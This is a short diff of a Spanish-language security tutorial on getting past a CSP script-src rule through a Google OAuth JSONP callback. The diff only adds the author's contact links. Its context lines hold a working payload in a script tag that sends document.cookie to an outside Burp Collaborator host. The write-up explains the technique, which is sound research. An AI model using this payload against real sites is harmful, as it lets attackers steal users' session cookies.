@@ -21,3 +21,7 @@ Ese es nuestro JSONP, y un ejemplo de uso sería este:
 `<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27http://xxx.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie})"></script>`
 
 En ese ejemplo, enviamos las cookies a nuestro cliente burp con un bypass de csp script-src.
+
+
+
+Contacto: [Linkedin](www.linkedin.com/in/JairR) [Twitter](https://twitter.com/_niggurath_)
